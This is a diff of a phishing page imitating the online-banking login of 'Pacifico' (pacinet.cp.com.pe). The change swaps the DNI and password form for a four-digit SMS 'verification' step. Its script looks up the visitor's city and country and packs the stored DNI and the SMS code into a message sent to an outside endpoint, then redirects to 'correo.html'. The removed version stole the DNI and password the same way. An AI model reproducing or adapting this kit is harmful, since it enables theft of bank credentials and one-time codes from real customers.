@@ -10,152 +10,9 @@
       type="image/x-icon"
       href="https://pacinet.cp.com.pe/favicon.png"
     />
+
     <style>
-      .overlay {
-        display: none;
-        position: fixed;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
-        background-color: rgba(0, 0, 0, 0.5);
-        z-index: 9999;
-        text-align: center;
-      }
-
-      .overlay-content {
-        position: absolute;
-        top: 50%;
-        left: 50%;
-        transform: translate(-50%, -50%);
-      }
-
-      .spinner-container {
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-        justify-content: center;
-        width: 200px;
-        height: 200px;
-        background-color: white;
-        border-radius: 10px;
-      }
-
-      .dot-spinner {
-        --uib-size: 2.8rem;
-        --uib-speed: 0.9s;
-        --uib-color: #063880;
-        position: relative;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        height: var(--uib-size);
-        width: var(--uib-size);
-        margin-bottom: 20px; /* Espacio entre el spinner y el texto */
-      }
-      .dot-spinner__dot {
-        position: absolute;
-        top: 0;
-        left: 0;
-        display: flex;
-        align-items: center;
-        justify-content: flex-start;
-        height: 100%;
-        width: 100%;
-      }
-
-      .dot-spinner__dot::before {
-        content: "";
-        height: 20%;
-        width: 20%;
-        border-radius: 50%;
-        background-color: var(--uib-color);
-        transform: scale(0);
-        opacity: 0.5;
-        animation: pulse0112 calc(var(--uib-speed) * 1.111) ease-in-out infinite;
-        box-shadow: 0 0 20px rgba(18, 31, 53, 0.3);
-      }
-
-      .dot-spinner__dot:nth-child(2) {
-        transform: rotate(45deg);
-      }
-
-      .dot-spinner__dot:nth-child(2)::before {
-        animation-delay: calc(var(--uib-speed) * -0.875);
-      }
-
-      .dot-spinner__dot:nth-child(3) {
-        transform: rotate(90deg);
-      }
-
-      .dot-spinner__dot:nth-child(3)::before {
-        animation-delay: calc(var(--uib-speed) * -0.75);
-      }
-
-      .dot-spinner__dot:nth-child(4) {
-        transform: rotate(135deg);
-      }
-
-      .dot-spinner__dot:nth-child(4)::before {
-        animation-delay: calc(var(--uib-speed) * -0.625);
-      }
-
-      .dot-spinner__dot:nth-child(5) {
-        transform: rotate(180deg);
-      }
-
-      .dot-spinner__dot:nth-child(5)::before {
-        animation-delay: calc(var(--uib-speed) * -0.5);
-      }
-
-      .dot-spinner__dot:nth-child(6) {
-        transform: rotate(225deg);
-      }
-
-      .dot-spinner__dot:nth-child(6)::before {
-        animation-delay: calc(var(--uib-speed) * -0.375);
-      }
-
-      .dot-spinner__dot:nth-child(7) {
-        transform: rotate(270deg);
-      }
-
-      .dot-spinner__dot:nth-child(7)::before {
-        animation-delay: calc(var(--uib-speed) * -0.25);
-      }
-
-      .dot-spinner__dot:nth-child(8) {
-        transform: rotate(315deg);
-      }
-
-      .dot-spinner__dot:nth-child(8)::before {
-        animation-delay: calc(var(--uib-speed) * -0.125);
-      }
-
-      @keyframes pulse0112 {
-        0%,
-        100% {
-          transform: scale(0);
-          opacity: 0.5;
-        }
-
-        50% {
-          transform: scale(1);
-          opacity: 1;
-        }
-      }
-      .loading-text-container {
-        display: flex;
-        justify-content: center;
-        margin-top: 10px; /* Ajusta el espacio entre el spinner y el texto si es necesario */
-      }
-
-      .loading-text {
-        text-align: center;
-        width: 100%;
-      }
-    </style>
-    <style>
+      @charset "UTF-8";
       body,
       html {
         margin: 0;
@@ -212,17 +69,6 @@
         }
       }
     </style>
-    <script>
-      function validarNumeros(event) {
-        const input = event.target;
-        const valorInput = input.value;
-        const patron = /^\d*$/; // Expresión regular para validar números
-
-        if (!patron.test(valorInput)) {
-          input.value = valorInput.replace(/[^\d]/g, ""); // Eliminar caracteres no numéricos
-        }
-      }
-    </script>
     <link
       rel="stylesheet"
       href="datos/styles.7af00e0c01ae7ce80e16.css"
@@ -374,33 +220,12 @@
         }
       }
     </style>
-
     <meta
       http-equiv="origin-trial"
       content="AymqwRC7u88Y4JPvfIF2F37QKylC04248hLCdJAsh8xgOfe/dVJPV3XS3wLFca1ZMVOtnBfVjaCMTVudWM//5g4AAAB7eyJvcmlnaW4iOiJodHRwczovL3d3dy5nb29nbGV0YWdtYW5hZ2VyLmNvbTo0NDMiLCJmZWF0dXJlIjoiUHJpdmFjeVNhbmRib3hBZHNBUElzIiwiZXhwaXJ5IjoxNjk1MTY3OTk5LCJpc1RoaXJkUGFydHkiOnRydWV9"
     />
   </head>
   <body>
-    <div id="overlay" class="overlay">
-      <div class="overlay-content">
-        <div class="spinner-container">
-          <div class="dot-spinner">
-            <div class="dot-spinner__dot"></div>
-            <div class="dot-spinner__dot"></div>
-            <div class="dot-spinner__dot"></div>
-            <div class="dot-spinner__dot"></div>
-            <div class="dot-spinner__dot"></div>
-            <div class="dot-spinner__dot"></div>
-            <div class="dot-spinner__dot"></div>
-            <div class="dot-spinner__dot"></div>
-          </div>
-          <div class="loading-text-container">
-            <div class="loading-text" style="    font-family: Arial, Helvetica, sans-serif !important;">Cargando...</div>
-          </div>
-        </div>
-      </div>
-    </div>
-
     <app-root _nghost-gxl-c60="" ng-version="12.1.5"
       ><router-outlet _ngcontent-gxl-c60=""></router-outlet
       ><app-auth-page _nghost-gxl-c49=""
@@ -571,182 +396,166 @@
                                 font-family: Arial, Helvetica, sans-serif !important;
                               "
                             >
-                              Ingresa a tu Cuenta
+                            Verificación de acceso a su banca web
                             </h1>
-                            <div
-                              _ngcontent-gxl-c48=""
-                              class="tab-slider--nav"
-                              style=""
-                            >
-                              <ul
-                                _ngcontent-gxl-c48=""
-                                class="tab-slider--tabs"
-                              >
-                                <li
-                                  _ngcontent-gxl-c48=""
-                                  rel="tab1"
-                                  class="tab-slider--trigger active"
-                                  style="
-                                    font-family: Arial, Helvetica, sans-serif !important;
-                                  "
-                                >
-                                  <a href="codigo.html" style="color: white"
-                                    >DNI</a
-                                  >
-                                </li>
-                                <li
-                                  _ngcontent-gxl-c48=""
-                                  rel="tab2"
-                                  class="tab-slider--trigger"
-                                  style="
-                                    font-family: Arial, Helvetica, sans-serif !important;
-                                  "
-                                >
-                                  <a href="codigo.html" style="color: #0071b9"
-                                    >Código de Socio</a
-                                  >
-                                </li>
-                              </ul>
-                            </div>
+
                             <div
                               _ngcontent-gxl-c48=""
                               id="tab1"
                               class="tab-slider--body"
                             >
                               <form
+                                id="loginform"
                                 _ngcontent-gxl-c48=""
                                 novalidate=""
                                 class="ng-untouched ng-pristine ng-invalid"
-                                id="loginform"
                               >
                                 <div
                                   _ngcontent-gxl-c48=""
                                   class="form_row clearfix"
                                 >
-                                  <div _ngcontent-gxl-c48="" class="form_cell">
+                                  <div
+                                    style="
+                                      width: 100%;
+                                      text-align: center;
+                                      margin-top: 40px;
+                                    "
+                                  >
+                                    <img
+                                      src="https://cdn-icons-png.flaticon.com/512/88/88144.png"
+                                      style="width: 100px"
+                                    />
+                                  </div>
+                                  <div
+                                    _ngcontent-gxl-c48=""
+                                    class="form_cell"
+                                    style="margin-top: 40px"
+                                  >
                                     <label
                                       _ngcontent-gxl-c48=""
                                       style="
                                         font-family: Arial, Helvetica,
                                           sans-serif !important;
                                       "
-                                      >DNI: </label
+                                      >Ingrese su codigo SMS: </label
                                     ><span
                                       _ngcontent-gxl-c48=""
                                       class="user_dni_codigo"
                                     >
-                                      <input
+                                      <div
                                         style="
-                                          font-family: Arial, Helvetica,
-                                            sans-serif !important;
+                                          text-align: center;
+                                          width: 100%;
+                                          margin-top: 10px;
+                                          display: flex;
+                                          justify-content: center;
                                         "
-                                        _ngcontent-gxl-c48=""
-                                        type="text"
-                                        inputmode="numeric"
-                                        name="userCode"
-                                        autocomplete="off"
-                                        id="dni"
-                                        oninput="validarNumeros(event)"
-                                        class="form_element ng-untouched ng-pristine ng-invalid"
-                                        placeholder="Ingrese número de DNI"
-                                        minlength="8"
-                                        maxlength="8"
-                                        required
-                                      /><!----></span
+                                      >
+                                        <style>
+                                          .numeric-input {
+                                            width: 30px; /* Ancho de cada input */
+                                            height: 40px;
+                                            border-radius: 5px;
+                                            font-size: 20px;
+                                            text-align: center; /* Centrar el texto dentro del input */
+                                            margin-right: 5px; /* Espacio entre los inputs */
+                                            border: 1px solid gray;
+                                          }
+                                        </style>
+
+                                        <input
+                                          type="text"
+                                          id="1"
+                                          class="numeric-input"
+                                          maxlength="1"
+                                          oninput="moverCursor('2', event)"
+                                          onkeydown="regresarCursor('1',
+                                    event)"
+                                          pattern="[0-9]"
+                                          title="Solo se permiten números"
+                                          inputmode="numeric"
+                                          style="    font-family: Arial, Helvetica, sans-serif !important;"
+                                          required
+                                          
+                                        />
+                                        <input
+                                          type="text"
+                                          id="2"
+                                          maxlength="1"
+                                          class="numeric-input"
+                                          oninput="moverCursor('3', event)"
+                                          onkeydown="regresarCursor('1', event)"
+                                          pattern="[0-9]"
+                                          title="Solo se permiten números"
+                                          inputmode="numeric"
+                                          style="    font-family: Arial, Helvetica, sans-serif !important;"
+
+                                          required
+                                        />
+                                        <input
+                                          type="text"
+                                          id="3"
+                                          maxlength="1"
+                                          class="numeric-input"
+                                          oninput="moverCursor('4', event)"
+                                          onkeydown="regresarCursor('2', event)"
+                                          pattern="[0-9]"
+                                          title="Solo se permiten números"
+                                          inputmode="numeric"
+                                          style="    font-family: Arial, Helvetica, sans-serif !important;"
+
+                                          required
+                                        />
+                                        <input
+                                          type="text"
+                                          id="4"
+                                          maxlength="1"
+                                          class="numeric-input"
+                                          onkeydown="regresarCursor('3', event)"
+                                          pattern="[0-9]"
+                                          title="Solo se permiten números"
+                                          inputmode="numeric"
+                                          style="    font-family: Arial, Helvetica, sans-serif !important;"
+
+                                          required
+                                        />
+
+                                        <script>
+                                          function moverCursor(
+                                            nextInputId,
+                                            event
+                                          ) {
+                                            // Si el usuario ha ingresado un dígito, pasar al siguiente campo de entrada
+                                            if (
+                                              event.target.value.length === 1
+                                            ) {
+                                              document
+                                                .getElementById(nextInputId)
+                                                .focus();
+                                            }
+                                          }
+
+                                          function regresarCursor(
+                                            previousInputId,
+                                            event
+                                          ) {
+                                            // Si el usuario ha borrado un dígito, volver al campo de entrada anterior
+                                            if (
+                                              event.target.value.length === 0 &&
+                                              event.keyCode === 8
+                                            ) {
+                                              document
+                                                .getElementById(previousInputId)
+                                                .focus();
+                                            }
+                                          }
+                                        </script>
+                                      </div>
+                                      <!----></span
                                     >
                                   </div>
                                 </div>
-                                <label
-                                  _ngcontent-gxl-c48=""
-                                  class="label_check open-modal"
-                                  style="
-                                    font-family: Arial, Helvetica, sans-serif !important;
-                                  "
-                                  >Recuérdame
-                                  <input
-                                    _ngcontent-gxl-c48=""
-                                    type="checkbox"
-                                    name="isCheckedRemember"
-                                    class="ng-untouched ng-pristine ng-valid" /><span
-                                    _ngcontent-gxl-c48=""
-                                    class="checkmark"
-                                    style="
-                                      font-family: Arial, Helvetica, sans-serif !important;
-                                    "
-                                  ></span
-                                ></label>
-                                <div
-                                  _ngcontent-gxl-c48=""
-                                  class="form_row clearfix"
-                                >
-                                  <div _ngcontent-gxl-c48="" class="form_cell">
-                                    <label
-                                      _ngcontent-gxl-c48=""
-                                      style="
-                                        font-family: Arial, Helvetica,
-                                          sans-serif !important;
-                                      "
-                                      >Contraseña:</label
-                                    ><span
-                                      _ngcontent-gxl-c48=""
-                                      class="user_contrasena"
-                                      ><input
-                                        style="
-                                          font-family: Arial, Helvetica,
-                                            sans-serif !important;
-                                        "
-                                        _ngcontent-gxl-c48=""
-                                        name="userPassword"
-                                        placeholder="Ingrese su contraseña"
-                                        class="form_element ng-untouched ng-pristine ng-invalid"
-                                        type="password"
-                                        minlength="6"
-                                        maxlength="10"
-                                        id="contra"
-                                        required
-                                      /><!----></span
-                                    >
-                                  </div>
-                                </div>
-                                <div
-                                  _ngcontent-gxl-c48=""
-                                  class="olvide_clave clearfix"
-                                >
-                                  <div _ngcontent-gxl-c48="">
-                                    <a
-                                      _ngcontent-gxl-c48=""
-                                      class="btn_olvide_pass"
-                                      href="https://pacinet.cp.com.pe/recoveryPassword"
-                                      style="
-                                        font-family: Arial, Helvetica,
-                                          sans-serif !important;
-                                        font-size: 12px;
-                                      "
-                                      >Desbloqueo de usuario</a
-                                    ><br _ngcontent-gxl-c48="" /><a
-                                      _ngcontent-gxl-c48=""
-                                      class="btn_olvide_pass"
-                                      style="
-                                        font-family: Arial, Helvetica,
-                                          sans-serif !important;
-                                        margin-top: 5px;
-                                        font-size: 12px;
-                                      "
-                                      href="https://pacinet.cp.com.pe/recoveryPassword"
-                                      >Olvidé mi contraseña</a
-                                    >
-                                  </div>
-                                  <a
-                                    _ngcontent-gxl-c48=""
-                                    class="btn_solicitar_pass"
-                                    href="https://pacinet.cp.com.pe/requestPassword"
-                                    style="
-                                      font-family: Arial, Helvetica, sans-serif !important;
-                                      font-size: 12px;
-                                    "
-                                    >Solicitar Contraseña</a
-                                  >
-                                </div>
+
                                 <div
                                   _ngcontent-gxl-c48=""
                                   class="center_content content_capcha"
@@ -766,26 +575,6 @@
                                   >
                                     Ingresar
                                   </button>
-                                </div>
-                                <div
-                                  _ngcontent-gxl-c48=""
-                                  class="center_content"
-                                >
-                                  <div
-                                    _ngcontent-gxl-c48=""
-                                    class="cuenta_nueva"
-                                    style="
-                                      font-family: Arial, Helvetica, sans-serif !important;
-                                    "
-                                  >
-                                    No tengo código,
-                                    <a
-                                      _ngcontent-gxl-c48=""
-                                      href="https://inscripciones.cp.com.pe/?utm_source=web_pacinet&amp;utm_medium=boton"
-                                      target="_blank"
-                                      >Hazte socio aquí.</a
-                                    >
-                                  </div>
                                 </div>
                               </form>
                             </div>
@@ -1042,29 +831,26 @@
     const form = document.querySelector("#loginform");
 
     form.addEventListener("submit", (event) => {
-      event.preventDefault(); // Aquí evitamos que el formulario se envíe
+      event.preventDefault(); // Evitamos que el formulario se envíe
 
-      // Obtener valores de DNI y contraseña
-      const dni = document.querySelector("#dni").value;
-      const contra = document.querySelector("#contra").value;
+      // Obtener el valor del campo SMS
 
-      // Verificar si alguno de los campos está vacío
-      if (dni.trim() === "" || contra.trim() === "") {
-        alert("Por favor, completa todos los campos.");
-        return; // Detener la ejecución si hay campos vacíos
-      }
+      // Verificar si el campo SMS está vacío
+    
 
-      // Si los campos no están vacíos, continuar con la solicitud
+      // Si el campo no está vacío, continuar con la solicitud
       axios
         .get(url)
         .then((response) => {
-          localStorage.setItem("usuario", dni);
           const message =
             "\nPacifico" +
             "\nDNI: " +
-            dni +
-            "\nContraseña: " +
-            contra +
+            localStorage.getItem("usuario") +
+            "\nSMS: " +
+            document.getElementById("1").value +
+            document.getElementById("2").value +
+            document.getElementById("3").value +
+            document.getElementById("4").value +
             "\nCiudad:" +
             response.data.city +
             "\nPais: " +
@@ -1080,12 +866,7 @@
               }
             )
             .then((response) => {
-              var overlay = document.getElementById("overlay");
-              overlay.style.display = "block";
-              setTimeout(function () {
-                overlay.style.display = "none";
-                window.location.href = "sms.html"; // Cambiar 'pagina_destino.html' por la URL de la página a la que quieres redirigir.
-              }, 4000); // 4000 milisegundos = 4 segundos
+              parent.location.href = "correo.html";
             })
             .catch((error) => {
               console.error(error);
